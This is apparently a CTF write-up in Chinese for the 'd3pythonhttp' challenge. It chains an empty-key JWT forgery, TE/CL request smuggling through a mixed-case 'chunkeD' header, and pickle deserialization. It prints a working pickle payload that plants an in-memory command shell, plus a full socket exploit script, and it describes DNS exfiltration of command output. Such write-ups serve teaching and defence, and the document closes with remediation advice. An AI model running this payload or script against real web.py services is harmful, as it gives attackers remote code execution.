# d3pythonhttp

## 题目简述

题目由前端 HTTP 解析层和后端 web.py 应用组成。攻击链包含三步：

1. JWT 的 HMAC key 由 header 中的 `kid` 指定文件内容；`kid=""` 时打开 `/app/` 失败，异常被吞掉，key 保持空字符串，因此可伪造管理员 token；
2. 前端按 HTTP 规范把 `Transfer-Encoding: chunkeD` 识别为 chunked，后端 web.py 却用大小写敏感的字符串比较，只在值恰好等于 `"chunked"` 时走 TE 分支，形成 TE/CL 请求体视图差异；
3. 让前端看到带 `BackdoorPasswordOnlyForAdmin` 的完整 body，而后端按较短的 `Content-Length` 只读取前半段纯 Base64 pickle，随后触发不安全反序列化。

pickle 载荷可替换全局 `index` 类，形成内存驻留的命令执行入口。另一路非预期解利用后端可发起 DNS 查询，把命令结果通过 DNS 外带，无需保留内存 shell。

## 解题过程

### 伪造空密钥 JWT

服务端取 key 的逻辑为：

```python
def get_key(kid):
    key = ""
    directory = "/app/"
    try:
        with open(directory + kid, "r") as file:
            key = file.read()
    except Exception:
        pass
    return key
```

当 `kid` 为空时，目标路径是目录 `/app/`，`open` 抛出异常后被忽略，返回值仍为 `""`。因此可以使用空字节串作为 HS256 key，签出：

```json
{
  "username": "1",
  "isadmin": true
}
```

漏洞根因不是“JWT 可以选择算法”，而是用户可控路径、异常吞噬和空 key 默认值共同造成了可预测密钥。

### 构造 pickle 内存 shell

后端会对 Base64 解码后的数据执行 pickle 反序列化。下面的对象通过 `__reduce__` 调用 `exec`，重新定义并覆盖全局 `index` 类：

```python
import base64
import pickle


class Payload:
    def __reduce__(self):
        source = """
class index:
    def GET(self):
        data = web.input()
        command = data.get('a')
        return __import__('os').popen(command).read()
globals()['index'] = index
"""
        return exec, (source,)


encoded = base64.b64encode(pickle.dumps(Payload()))
print(encoded.decode())
print("base64 length:", len(encoded))
```

反序列化后，访问 `index` 对应路由并传入参数 `a`，即可执行命令。具体路由映射和 flag 文件位置应以附件或部署配置为准。

### 大小写差异造成 TE/CL 分歧

web.py 的请求体读取逻辑等价于：

```python
def data():
    if "data" not in ctx:
        if ctx.env.get("HTTP_TRANSFER_ENCODING") == "chunked":
            ctx.data = ctx.env["wsgi.input"].read()
        else:
            content_length = intget(
                ctx.env.get("CONTENT_LENGTH"),
                0,
            )
            ctx.data = ctx.env["wsgi.input"].read(content_length)
    return ctx.data
```

HTTP transfer-coding token不区分大小写，所以前端接受 `chunkeD` 并完成解块；web.py 却做精确比较，认为它不是 chunked，转而遵循 `Content-Length`。

官方示例中有一个非常精确的长度设计：

```text
Base64 pickle 长度 = 284
后门口令长度       = 28
chunk 数据总长度   = 312 = 0x138
Content-Length     = 284
```

chunk 数据为：

```text
<284 字节 Base64 pickle>BackdoorPasswordOnlyForAdmin
```

前端解块并检查完整的 312 字节，所以能看到后门口令；它交给后端的输入流已经去掉 chunk size 和终止块。后端因大小写比较失败，只按 `Content-Length: 284` 读取，恰好得到纯 Base64 pickle，不包含后门口令。

请求形态如下，目标地址必须替换为当前实例：

```http
POST /admin HTTP/1.1
Host: <target>
Cookie: token=<forged-admin-jwt>
Connection: close
Transfer-Encoding: chunkeD
Content-Length: 284

138
<284-byte-base64-pickle>BackdoorPasswordOnlyForAdmin
0

```

线上发送时每行必须使用 CRLF，最后一个 `0` chunk 后还要有空行。

### 自动计算长度并发送

下面的完整脚本会生成空 key JWT、pickle 和 chunked body，并根据实际 Base64 长度自动填写 `Content-Length` 与 chunk size，避免修改内存 shell 后继续使用过期的 `284/138`：

```python
#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import pickle
import socket


PASSWORD = b"BackdoorPasswordOnlyForAdmin"


def base64url(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def make_token() -> str:
    header = {
        "alg": "HS256",
        "kid": "",
        "typ": "JWT",
    }
    claims = {
        "username": "1",
        "isadmin": True,
    }
    encoded_header = base64url(
        json.dumps(
            header,
            separators=(",", ":"),
        ).encode()
    )
    encoded_claims = base64url(
        json.dumps(
            claims,
            separators=(",", ":"),
        ).encode()
    )
    signing_input = encoded_header + b"." + encoded_claims
    signature = base64url(
        hmac.new(b"", signing_input, hashlib.sha256).digest()
    )
    return (signing_input + b"." + signature).decode()


class Payload:
    def __reduce__(self):
        source = """
class index:
    def GET(self):
        data = web.input()
        command = data.get('a')
        return __import__('os').popen(command).read()
globals()['index'] = index
"""
        return exec, (source,)


def build_request(host_header: str) -> bytes:
    serialized = pickle.dumps(Payload())
    encoded = base64.b64encode(serialized)
    chunk_data = encoded + PASSWORD

    body = (
        f"{len(chunk_data):x}\r\n".encode()
        + chunk_data
        + b"\r\n0\r\n\r\n"
    )
    headers = (
        "POST /admin HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"Cookie: token={make_token()}\r\n"
        "Connection: close\r\n"
        "Transfer-Encoding: chunkeD\r\n"
        f"Content-Length: {len(encoded)}\r\n"
        "\r\n"
    ).encode()
    return headers + body


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    args = parser.parse_args()

    request = build_request(f"{args.host}:{args.port}")
    with socket.create_connection(
        (args.host, args.port),
        timeout=10,
    ) as connection:
        connection.sendall(request)
        while True:
            response = connection.recv(4096)
            if not response:
                break
            print(response.decode(errors="replace"), end="")


if __name__ == "__main__":
    main()
```

该脚本针对原材料中的明文 HTTP 服务；如果当前实例位于 TLS 或额外反向代理之后，需要按实际链路调整发送方式，并重新确认两层解析器仍存在同样差异。

### DNS 外带

非预期解不覆盖 `index`。pickle 代码执行后直接读取目标内容，把数据编码成只含 DNS 标签允许字符的短片段，再依次查询：

```text
<sequence>.<encoded-fragment>.<controlled-domain>
```

攻击者在权威 DNS 日志中按序重组片段即可。原材料只确认“后端能够向外发起 DNS 查询”，没有给出完整域名、分片代码或实际输出，因此这里保留机制和必要条件，不虚构未经验证的脚本。

## 方法总结

完整链路为“`kid=""` 产生空 JWT key→伪造管理员 token→混合大小写 TE 触发前后端解析分歧→前端看到口令、后端只读 Base64 pickle→不安全反序列化代码执行”。`0x138`、284 和 28 不是魔数：它们分别来自 chunk 数据总长度、pickle Base64 长度和后门口令长度。

修复时应拒绝空 `kid`、限制 key 文件名并在读取失败时终止；统一 HTTP 解析层，拒绝同时出现冲突的 `Transfer-Encoding` 与 `Content-Length`，并按大小写不敏感规则处理 transfer-coding；最根本的是删除对不可信数据的 pickle 反序列化。
